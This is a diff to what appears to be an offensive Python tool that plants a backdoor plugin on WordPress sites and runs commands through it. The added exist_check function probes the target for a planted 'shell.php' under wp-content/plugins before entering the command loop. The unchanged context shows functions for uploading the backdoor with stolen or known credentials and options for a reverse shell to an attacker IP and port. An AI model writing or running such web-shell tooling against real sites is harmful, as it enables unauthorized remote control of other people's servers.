@@ -387,6 +387,12 @@ def safety(host,uploaddir):
     else:
         return True
 
+def exist_check(target,uploaddir):
+    r = requests.get(target + '/wp-content/plugins/' + uploaddir + '/shell.php')
+    if r.status_code == 200:
+        return True
+    else:
+        return False
 
 def printbanner():
     banner = """\
@@ -437,7 +443,10 @@ def main():
             uploaddir = uploadbackdoor(args.target, args.username, args.password, "shell", args.verbose, args.agent)
         else:
             uploaddir = args.existing
-        commandloop(args.target, uploaddir)
+        if exist_check(args.target, uploaddir):
+            commandloop(args.target, uploaddir)
+        else:
+            print "Existing shell not found.  Please verify the path or upload a new shell."
 
     if args.reverse and args.interactive:
         if args.ip is None or args.port is None:
